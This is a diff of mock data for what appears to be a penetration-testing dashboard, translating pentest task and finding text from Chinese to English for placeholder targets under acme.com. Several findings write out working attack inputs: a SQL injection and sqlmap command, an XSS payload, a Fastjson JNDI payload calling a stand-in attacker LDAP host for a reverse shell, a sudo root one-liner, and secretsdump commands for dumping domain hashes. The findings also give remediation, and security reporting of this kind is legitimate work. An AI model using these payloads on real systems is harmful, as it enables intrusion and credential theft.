@@ -54,9 +54,9 @@ export const tasks: Task[] = [
   {
     id: "t-acme-web",
     category_id: 1,
-    category_name: "外部评估",
-    description: "Acme 官网与后台外部渗透（acme.com）",
-    goal: "拿到 acme.com 后台管理权限，确认可读取用户敏感数据。",
+    category_name: "External Assessment",
+    description: "Acme website and admin portal external pentest (acme.com)",
+    goal: "Gain administrative access to acme.com and verify whether sensitive user data can be read.",
     status: "running",
     created_at: T("2026-07-24T09:12:00Z"),
     created_unix: 1785489120,
@@ -83,9 +83,9 @@ export const tasks: Task[] = [
   {
     id: "t-acme-api",
     category_id: 2,
-    category_name: "API 专项",
-    description: "api.acme.com 越权与注入测试",
-    goal: "评估 api.acme.com 订单/用户接口的越权(IDOR)与注入风险。",
+    category_name: "API Assessment",
+    description: "api.acme.com authorization and injection testing",
+    goal: "Assess IDOR and injection risks across api.acme.com order and user endpoints.",
     status: "running",
     created_at: T("2026-07-25T14:05:00Z"),
     created_unix: 1785592500,
@@ -112,9 +112,9 @@ export const tasks: Task[] = [
   {
     id: "t-shop-pay",
     category_id: 2,
-    category_name: "API 专项",
-    description: "shop.acme.com 支付与订单链路",
-    goal: "评估支付与订单接口的越权、金额篡改与竞态风险。",
+    category_name: "API Assessment",
+    description: "shop.acme.com payment and checkout flow",
+    goal: "Assess authorization bypass, price tampering, and race conditions in payment and order APIs.",
     status: "paused",
     created_at: T("2026-07-22T08:30:00Z"),
     created_unix: 1785313800,
@@ -140,9 +140,9 @@ export const tasks: Task[] = [
   {
     id: "t-vpn-edge",
     category_id: 1,
-    category_name: "外部评估",
-    description: "对外暴露面侦察（VPN / 边界服务）",
-    goal: "识别 acme.com 对外暴露的可利用边界服务。",
+    category_name: "External Assessment",
+    description: "External attack surface recon (VPN / perimeter services)",
+    goal: "Identify exposed, exploitable perimeter services on acme.com.",
     status: "done",
     created_at: T("2026-07-18T08:00:00Z"),
     created_unix: 1784966400,
@@ -172,14 +172,14 @@ export const tasks: Task[] = [
 export const taskCategories: TaskCategory[] = [
   {
     id: 1,
-    name: "外部评估",
+    name: "External Assessment",
     task_count: 2,
     created_at: T("2026-07-18T08:00:00Z"),
     updated_at: T("2026-07-25T08:00:00Z"),
   },
   {
     id: 2,
-    name: "API 专项",
+    name: "API Assessment",
     task_count: 2,
     created_at: T("2026-07-19T08:00:00Z"),
     updated_at: T("2026-07-24T08:00:00Z"),
@@ -189,17 +189,17 @@ export const taskCategories: TaskCategory[] = [
 export const taskTemplates: TaskTemplate[] = [
   {
     id: 1,
-    name: "外部 Web 渗透",
-    description: "对目标互联网暴露面开展黑盒渗透测试，覆盖站点、接口和常见管理入口。",
-    goal: "识别并验证可造成未授权访问、敏感数据泄露或服务器失陷的安全问题。",
+    name: "External Web Pentest",
+    description: "Run black-box penetration testing across external web apps, APIs, and common admin entry points.",
+    goal: "Identify and verify security issues that could lead to unauthorized access, sensitive data exposure, or server compromise.",
     created_at: T("2026-07-20T08:00:00Z"),
     updated_at: T("2026-07-25T08:00:00Z"),
   },
   {
     id: 2,
-    name: "API 越权专项",
-    description: "围绕目标 API 的身份认证、对象级授权和角色边界开展专项测试。",
-    goal: "确认是否存在 IDOR、水平越权、垂直越权及批量数据访问风险。",
+    name: "API Authorization Audit",
+    description: "Focus testing on API authentication, object-level authorization, and role boundaries.",
+    goal: "Verify whether IDOR, horizontal/vertical privilege escalation, or bulk data exposure exists.",
     created_at: T("2026-07-19T08:00:00Z"),
     updated_at: T("2026-07-24T08:00:00Z"),
   },
@@ -257,7 +257,7 @@ export const companies: Company[] = [
     logo: "",
     asset_count: 18,
     scope: [
-      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "主域" },
+      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "Primary domain" },
       { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
       { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
     ],
@@ -272,7 +272,7 @@ export const assets: Asset[] = [
     task_ids: [1],
     domain: "acme.com",
     root_domain: "acme.com",
-    icp: "京ICP备2021xxxx号",
+    icp: "US-REG-2021-ACME",
     record_type: "A",
     record_value: ["203.0.113.10"],
     last_seen: T("2026-07-26T02:00:00Z"),
@@ -397,11 +397,11 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "https://www.acme.com",
-    app_name: "Acme 官网",
+    app_name: "Acme Website",
     category: "corp",
     status_code: 200,
     content_length: 48213,
-    page_title: "Acme Corp — 企业官网",
+    page_title: "Acme Corp — Corporate Website",
     technologies: ["Nginx", "React", "Cloudflare"],
     favicon_mmh3: "-1580860059",
     last_seen: T("2026-07-26T02:08:00Z"),
@@ -412,11 +412,11 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "https://admin.acme.com",
-    app_name: "后台管理",
+    app_name: "Admin Portal",
     category: "admin",
     status_code: 200,
     content_length: 12044,
-    page_title: "Acme Admin 登录",
+    page_title: "Acme Admin Sign In",
     technologies: ["Nginx", "Vue", "Element-UI"],
     last_seen: T("2026-07-26T02:09:00Z"),
   },
@@ -556,7 +556,7 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "http://10.10.10.20:8080",
-    app_name: "Jenkins (内部)",
+    app_name: "Jenkins (Internal)",
     category: "ci",
     status_code: 200,
     content_length: 14200,
@@ -600,16 +600,16 @@ export const findings: Finding[] = [
     id: "f-1",
     assets: [assetRef(18)],
     vulnclass: "SQL Injection",
-    name: "官网搜索接口报错型 SQL 注入",
+    name: "Error-Based SQL Injection in Search Endpoint",
     severity: "high",
     status: "pending",
     report:
-      '## 漏洞概述\n\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\n\n## 影响\n\n- 可读取 `acme_prod` 库的表结构与用户/订单数据\n- 报错回显便于快速构造利用，风险高\n\n## 复现步骤\n\n1. 触发报错注入：\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应回显 MSSQL 版本报错，确认可注入\n3. 进一步枚举库：`sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 修复建议\n\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\n- 关闭生产环境详细报错回显\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\n',
-    summary: "www.acme.com/search q 参数存在报错型 SQL 注入",
-    evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。",
+      '## Overview\n\nThe `q` parameter on `www.acme.com/search` is vulnerable to **error-based SQL injection** (MSSQL), allowing database version, schema, and sensitive data extraction.\n\n## Impact\n\n- Exposes table schemas and user/order records in `acme_prod`\n- Verbose SQL errors allow rapid payload crafting\n\n## Reproduction Steps\n\n1. Trigger error-based injection:\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. Confirm the response leaks the MSSQL version string in an error message\n3. Enumerate databases: `sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## Remediation\n\n- Use parameterized queries / prepared statements instead of string concatenation\n- Disable verbose database error messages in production\n- Enforce least-privilege DB accounts and disable dangerous extensions like `xp_cmdshell`\n',
+    summary: "Error-based SQL injection in www.acme.com/search q parameter",
+    evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- -> returns MSSQL version error, exposing DB schema.",
     intent_id: "i-2",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-26T01:20:00Z"),
   },
   {
@@ -618,11 +618,11 @@ export const findings: Finding[] = [
     vulnclass: "IDOR",
     severity: "high",
     status: "pending",
-    summary: "api.acme.com/v1/orders?id= 可越权读取他人订单",
-    evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。",
+    summary: "api.acme.com/v1/orders?id= allows reading other users' orders (IDOR)",
+    evidence: "Changing id=1001 to id=1002 returns another customer's order (including shipping address and phone) with no ownership check.",
     intent_id: "i-5",
     task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_description: "api.acme.com authorization and injection testing",
     ts: T("2026-07-26T02:44:00Z"),
   },
   {
@@ -631,10 +631,10 @@ export const findings: Finding[] = [
     vulnclass: "Weak JWT",
     severity: "high",
     status: "pending",
-    summary: "API JWT 使用弱密钥、可离线爆破伪造",
-    evidence: "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。",
+    summary: "API JWT signed with weak secret, crackable offline to forge tokens",
+    evidence: "HS256 signed with 'secret', cracked by John in 5s -> allows forging any sub claim.",
     task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_description: "api.acme.com authorization and injection testing",
     ts: T("2026-07-26T03:02:00Z"),
   },
   {
@@ -643,10 +643,10 @@ export const findings: Finding[] = [
     vulnclass: "Reflected XSS",
     severity: "medium",
     status: "pending",
-    summary: "搜索页对 q 参数未转义，反射型 XSS",
-    evidence: "q=<script>alert(document.domain)</script> 原样回显于结果标题。",
+    summary: "Reflected XSS via unescaped q parameter on search page",
+    evidence: "q=<script>alert(document.domain)</script> is echoed verbatim in the results heading.",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T22:10:00Z"),
   },
   {
@@ -655,10 +655,10 @@ export const findings: Finding[] = [
     vulnclass: "Exposed .git",
     severity: "medium",
     status: "pending",
-    summary: "www.acme.com 暴露 .git 目录，可还原源码",
-    evidence: "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。",
+    summary: "Exposed .git directory on www.acme.com allows source code recovery",
+    evidence: "GET /.git/HEAD -> 200; git-dumper recovered backend source code and DB connection comments.",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T20:30:00Z"),
   },
   {
@@ -667,11 +667,11 @@ export const findings: Finding[] = [
     vulnclass: "Default Credentials",
     severity: "high",
     status: "pending",
-    summary: "admin.acme.com 后台默认口令 admin/admin123",
-    evidence: "登录成功，进入管理后台，可管理用户与订单。",
+    summary: "Default credentials admin/admin123 on admin.acme.com",
+    evidence: "Signed in successfully to the admin console with full user and order management access.",
     intent_id: "i-3",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-26T03:50:00Z"),
   },
   {
@@ -680,10 +680,10 @@ export const findings: Finding[] = [
     vulnclass: "Open Redirect",
     severity: "low",
     status: "pending",
-    summary: "登录后 next 参数任意跳转",
-    evidence: "/login?next=https://evil.example 登录后 302 跳到外站。",
+    summary: "Open redirect via post-login next parameter",
+    evidence: "/login?next=https://evil.example returns a 302 redirect to an external site after login.",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T19:12:00Z"),
   },
   {
@@ -692,10 +692,10 @@ export const findings: Finding[] = [
     vulnclass: "Missing Rate Limit",
     severity: "medium",
     status: "pending",
-    summary: "登录接口无速率限制，可暴力破解",
-    evidence: "1000 次/分钟无锁定，无验证码。",
+    summary: "Missing rate limiting on login endpoint allows brute-force attacks",
+    evidence: "1,000 requests/min with no lockout or CAPTCHA.",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T18:40:00Z"),
   },
   {
@@ -704,10 +704,10 @@ export const findings: Finding[] = [
     vulnclass: "Verbose Error",
     severity: "low",
     status: "pending",
-    summary: "API 500 返回堆栈，泄露路径与框架版本",
-    evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。",
+    summary: "API 500 responses leak stack traces, paths, and framework versions",
+    evidence: "Triggering HTTP 500 returns a full Node.js stack trace exposing absolute paths and dependency versions.",
     task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_description: "api.acme.com authorization and injection testing",
     ts: T("2026-07-25T23:05:00Z"),
   },
   {
@@ -716,10 +716,10 @@ export const findings: Finding[] = [
     vulnclass: "Outdated Component",
     severity: "medium",
     status: "pending",
-    summary: "shop 使用存在已知 RCE 的老版本组件",
-    evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。",
+    summary: "shop uses an outdated library with known RCE vulnerabilities",
+    evidence: "Fingerprinted component v2.3.1, affected by CVE-2024-xxxx deserialization RCE.",
     task_id: "t-shop-pay",
-    task_description: "shop.acme.com 支付与订单链路",
+    task_description: "shop.acme.com payment and checkout flow",
     ts: T("2026-07-23T15:00:00Z"),
   },
   // ── 外网→内网纵深链路上的高危发现（active task）──
@@ -728,28 +728,28 @@ export const findings: Finding[] = [
     vulnclass: "Hardcoded Credentials",
     severity: "high",
     status: "pending",
-    summary: "泄露源码中硬编码数据库凭据 sa/Acme@2021",
-    evidence: "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。",
+    summary: "Hardcoded database credentials sa/Acme@2021 in leaked source code",
+    evidence: "git-dumper recovered config.php from www.acme.com/.git containing plaintext DB credentials later verified for internal reuse.",
     intent_id: "ig",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T20:36:00Z"),
   },
   {
     id: "f-12",
     assets: [assetRef(4)],
     vulnclass: "Deserialization RCE",
-    name: "shop 商城 Fastjson 反序列化远程命令执行",
+    name: "Fastjson Deserialization RCE on shop.acme.com",
     severity: "critical",
     status: "confirmed",
     report:
-      '## 漏洞概述\n\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n',
-    summary: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行",
+      '## Overview\n\n`shop.acme.com/api/import` parses user-controlled JSON with **Fastjson 1.2.24** without `safeMode`, allowing arbitrary `@type` instantiation and **JNDI injection -> remote code execution**.\n\n## Impact\n\n- Unauthenticated attackers can execute arbitrary commands on the DMZ web host (`www-data@dmz-web01`)\n- Combined with local privilege escalation, provides a pivot into the internal network\n\n## Reproduction Steps\n\n1. Craft a JNDI payload:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. Send `POST /api/import` with `Content-Type: application/json`\n3. Confirm outbound callback to DNSLog and reverse shell connection\n\n## Remediation\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`\n- Add authentication and origin validation to `/api/import`\n- Restrict egress traffic to block outbound LDAP/RMI from application servers\n',
+    summary: "Fastjson 1.2.24 deserialization RCE on shop.acme.com",
     evidence:
-      "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。",
+      "POST /api/import with JNDI payload (@type:JdbcRowSetImpl) -> outbound callback and reverse shell (www-data@dmz-web01).",
     intent_id: "i7",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T15:40:00Z"),
   },
   {
@@ -758,12 +758,12 @@ export const findings: Finding[] = [
     vulnclass: "Privilege Escalation",
     severity: "high",
     status: "pending",
-    summary: "DMZ 立足点 sudo NOPASSWD 错配可本地提权 root",
+    summary: "Local root privilege escalation via sudo NOPASSWD on DMZ foothold",
     evidence:
-      "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。",
+      "sudo -l shows (ALL) NOPASSWD: /usr/bin/python3 -> sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' yields root.",
     intent_id: "i8",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T16:20:00Z"),
   },
   {
@@ -772,11 +772,11 @@ export const findings: Finding[] = [
     vulnclass: "Network Segmentation",
     severity: "medium",
     status: "pending",
-    summary: "DMZ 主机双网卡直连内网，边界隔离失效",
-    evidence: "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。",
+    summary: "Dual-homed DMZ host directly reaches internal subnet, breaking segmentation",
+    evidence: "dmz-web01 has a second NIC on 10.10.10.0/24 with direct reachability to DC01, FS01, and Jenkins across the DMZ boundary.",
     intent_id: "i9",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T21:00:00Z"),
   },
   {
@@ -785,12 +785,12 @@ export const findings: Finding[] = [
     vulnclass: "Unauthenticated RCE",
     severity: "high",
     status: "pending",
-    summary: "内部 Jenkins 未授权 Script Console 远程命令执行",
+    summary: "Unauthenticated Jenkins Script Console RCE on internal host",
     evidence:
-      "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。",
+      "GET /script executes Groovy without auth: 'whoami'.execute().text -> SYSTEM; dumped domain account acme\\svc_deploy from credentials store.",
     intent_id: "i11",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T21:50:00Z"),
   },
   {
@@ -799,28 +799,28 @@ export const findings: Finding[] = [
     vulnclass: "Kerberoasting",
     severity: "high",
     status: "pending",
-    summary: "域服务账号 svc_sql 可被 Kerberoast 且口令弱",
-    evidence: "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。",
+    summary: "Domain service account svc_sql vulnerable to Kerberoasting with weak password",
+    evidence: "Requested TGS for svc_sql via GetUserSPNs; hashcat -m 13100 cracked Sql@2020 offline (member of SQL Admins).",
     intent_id: "i12",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-25T23:20:00Z"),
   },
   {
     id: "f-17",
     assets: [assetRef(20)],
     vulnclass: "Domain Compromise",
-    name: "内网域控 DC01 完全控制（Domain Admin）",
+    name: "Full Domain Controller Compromise on DC01 (Domain Admin)",
     severity: "critical",
     status: "confirmed",
     report:
-      "## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n",
-    summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成",
+      "## Overview\n\nChaining external Fastjson RCE, DMZ sudo privilege escalation, dual-NIC pivoting, and unauthenticated Jenkins RCE yielded the `svc_deploy` domain account, which belongs to **Domain Admins**, resulting in full compromise of **DC01**.\n\n## Impact\n\n- Full Domain Admin control over all hosts and accounts in the domain\n- `secretsdump` extracted all domain NTLM hashes including `krbtgt`, enabling Golden Ticket persistence\n- Internal target objective achieved\n\n## Reproduction Steps\n\n1. Authenticate as `svc_deploy` and dump domain hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Obtain SYSTEM on DC01 and extract NTDS.dit hashes\n\n## Remediation\n\n- Remove service accounts from Domain Admins and enforce AD tiering\n- Reset `krbtgt` twice and rotate all service account passwords\n- Enforce DMZ-to-internal segmentation and remediate the upstream RCE and privesc chain\n",
+    summary: "Compromised Domain Controller DC01 (Domain Admin) — internal objective achieved",
     evidence:
-      "svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。",
+      "svc_deploy belongs to Domain Admins; psexec.py gained SYSTEM on DC01 and secretsdump extracted all domain NTLM hashes including krbtgt.",
     intent_id: "i13",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "Acme website and admin portal external pentest",
     ts: T("2026-07-26T00:20:00Z"),
   },
 ];
@@ -836,7 +836,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "root",
       type: "fact",
-      payload: P({ summary: "根：acme.com 外网→内网纵深渗透" }),
+      payload: P({ summary: "Root: acme.com external-to-internal pentest" }),
       priority: 0,
       state: "origin",
       origin: "system",
@@ -847,7 +847,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g1",
       type: "goal",
-      payload: P({ text: "获取 acme.com 后台管理权限" }),
+      payload: P({ text: "Gain administrative access to acme.com" }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -856,7 +856,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g2",
       type: "goal",
-      payload: P({ text: "读取用户敏感数据" }),
+      payload: P({ text: "Access sensitive user data" }),
       priority: 8,
       state: "open",
       origin: "goals",
@@ -865,7 +865,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g3",
       type: "goal",
-      payload: P({ text: "从外网突破 DMZ，建立内网立足点" }),
+      payload: P({ text: "Breach DMZ from external perimeter and establish internal foothold" }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -874,7 +874,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g4",
       type: "goal",
-      payload: P({ text: "内网横向，拿下内部靶标域控 DC01" }),
+      payload: P({ text: "Move laterally and compromise Domain Controller DC01" }),
       priority: 10,
       state: "met",
       origin: "goals",
@@ -885,7 +885,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i1",
       type: "intent",
-      payload: P({ summary: "acme.com 子域枚举与端口扫描" }),
+      payload: P({ summary: "Enumerate acme.com subdomains and open ports" }),
       priority: 6,
       state: "done",
       origin: "planner",
@@ -894,7 +894,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i2",
       type: "intent",
-      payload: P({ summary: "admin 后台默认口令 / 弱口令测试" }),
+      payload: P({ summary: "Test default and weak credentials on admin portal" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -903,7 +903,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i3",
       type: "intent",
-      payload: P({ summary: "枚举后台功能与用户数据接口" }),
+      payload: P({ summary: "Enumerate admin features and user data endpoints" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -912,7 +912,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i4",
       type: "intent",
-      payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }),
+      payload: P({ summary: "Probe www.acme.com/search for SQL injection" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -921,7 +921,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i5",
       type: "intent",
-      payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }),
+      payload: P({ summary: "Test api.acme.com order endpoints for IDOR" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -930,7 +930,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "ig",
       type: "intent",
-      payload: P({ summary: "www.acme.com .git 源码泄露与硬编码凭据提取" }),
+      payload: P({ summary: "Dump exposed .git repo on www.acme.com and extract hardcoded credentials" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -941,7 +941,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i6",
       type: "intent",
-      payload: P({ summary: "shop.acme.com 组件指纹识别与 CVE 关联" }),
+      payload: P({ summary: "Fingerprint shop.acme.com stack and map known CVEs" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -950,7 +950,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i7",
       type: "intent",
-      payload: P({ summary: "触发 shop 反序列化 RCE，获取反弹 shell" }),
+      payload: P({ summary: "Exploit shop deserialization RCE for reverse shell" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -959,7 +959,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i8",
       type: "intent",
-      payload: P({ summary: "DMZ 立足点本地信息收集与提权至 root" }),
+      payload: P({ summary: "Local enumeration and privilege escalation to root on DMZ host" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -970,7 +970,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i9",
       type: "intent",
-      payload: P({ summary: "以立足点为 pivot 做内网主机发现" }),
+      payload: P({ summary: "Pivot from DMZ foothold for internal host discovery" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -979,7 +979,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i10",
       type: "intent",
-      payload: P({ summary: "内网凭据复用与密码喷洒" }),
+      payload: P({ summary: "Test credential reuse and password spraying internally" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -988,7 +988,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i11",
       type: "intent",
-      payload: P({ summary: "内部 Jenkins 未授权 Groovy 脚本执行(RCE)" }),
+      payload: P({ summary: "Exploit unauthenticated Jenkins Groovy Script Console (RCE)" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -997,7 +997,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i12",
       type: "intent",
-      payload: P({ summary: "对域服务账号做 Kerberoasting 并离线破解" }),
+      payload: P({ summary: "Kerberoast domain service accounts and crack tickets offline" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -1006,7 +1006,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i13",
       type: "intent",
-      payload: P({ summary: "用域管理员凭据登录并控制域控 DC01" }),
+      payload: P({ summary: "Authenticate with Domain Admin credentials and take over DC01" }),
       priority: 10,
       state: "done",
       origin: "planner",
@@ -1017,7 +1017,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa1",
       type: "fact",
-      payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }),
+      payload: P({ summary: "Discovered subdomain admin.acme.com (Element-UI admin portal)" }),
       priority: 0,
       state: "open",
       origin: "work#1",
@@ -1026,7 +1026,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa2",
       type: "fact",
-      payload: P({ summary: "search 页 q 参数为 error-based 注入点(MSSQL)" }),
+      payload: P({ summary: "Search q parameter is an error-based SQLi point (MSSQL)" }),
       priority: 0,
       state: "open",
       origin: "work#4",
@@ -1035,7 +1035,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faGit",
       type: "fact",
-      payload: P({ summary: ".git 可下载，git-dumper 还原出后端源码" }),
+      payload: P({ summary: ".git is downloadable; git-dumper recovered backend source code" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1044,7 +1044,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faCreds",
       type: "fact",
-      payload: P({ summary: "源码 config.php 硬编码 DB 口令 sa / Acme@2021（疑似内网通用）" }),
+      payload: P({ summary: "config.php hardcodes DB credentials sa / Acme@2021 (likely reused internally)" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1053,7 +1053,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa3",
       type: "fact",
-      payload: P({ summary: "shop 指纹命中 Fastjson 1.2.24（存在已知反序列化 RCE）" }),
+      payload: P({ summary: "shop fingerprinted as Fastjson 1.2.24 (known deserialization RCE)" }),
       priority: 0,
       state: "open",
       origin: "work#6",
@@ -1062,7 +1062,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa4",
       type: "fact",
